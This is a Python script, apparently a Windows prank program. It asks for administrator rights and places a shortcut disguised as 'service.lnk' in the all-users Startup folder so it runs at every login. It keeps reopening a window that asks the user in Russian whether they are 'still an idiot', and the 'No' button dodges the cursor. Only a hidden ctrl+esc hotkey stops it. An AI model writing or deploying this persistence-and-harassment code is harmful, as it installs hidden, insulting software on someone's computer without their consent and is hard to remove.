import asyncio
import os
import pyuac
import shutil
import sys
import time
import pythoncom
from random import randint
from threading import Thread
from tkinter import *
from tkinter import messagebox

import keyboard
from win32com.client import Dispatch




def start():
    while flag:
        print('check')
        asyncio.run(add_autostart())
        asyncio.run(check_double_program())
        time.sleep(3)


@pyuac.main_requires_admin
async def add_autostart():
    global current_file
    target_path = r'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'
    name = 'service.lnk'

    if not os.path.isfile(target_path + "\\" + name):
        print('create shortcut')
        create_shortcut(
            file_name=name,
            target=current_file)
        shutil.move(name, target_path)
    else:
        print('already exists')


def create_shortcut(file_name: str, target: str):
    pythoncom.CoInitialize()
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(file_name)
    shortcut.TargetPath = target
    shortcut.save()


async def check_double_program():
    pass


def start_window():
    task_tk = Thread(target=window_tk)
    task_tk.start()
    while True:
        if not task_tk.is_alive() and flag:
            print('Start again')
            task_tk = Thread(target=window_tk)
            time.sleep(3)
            task_tk.start()
        if not flag:
            window_tk(destroy=True)
            break
        time.sleep(0.5)


def window_tk(destroy=False):
    root = Tk()
    if destroy:
        root.quit()
        return
    root.geometry('600x400')

    button_no = Button(root, text='Нет', font='Arial 20 bold')
    label = Label(root, text='Ты все еще даун?', font='Arial 20 bold', bg='white')
    x = (root.winfo_screenwidth() - root.winfo_reqwidth()) / 2
    y = (root.winfo_screenheight() - root.winfo_reqwidth()) / 2
    root.wm_geometry('+%d+%d' % (x, y))
    root.title(' ')
    root.resizable(width=False, height=False)
    root['bg'] = 'white'
    label.pack()
    button_no.place(x=170, y=100)
    button_no.bind('<Enter>',
                   lambda *args: button_no.place(x=randint(100, 500), y=randint(100, 300)))
    Button(root, text='Да', font='Arial 20 bold',
           command=lambda: [messagebox.showinfo(' ', 'Я так и знал'), exit()]).place(x=350, y=100)
    root.mainloop()


def key_exit():
    print('flag')
    global flag
    flag = False
    sys.exit()


keyboard.add_hotkey('ctrl+esc', key_exit)

if __name__ == '__main__':
    flag = True
    current_file = __file__

    task1 = Thread(target=start)
    task2 = Thread(target=start_window)

    task1.start()
    task2.start()
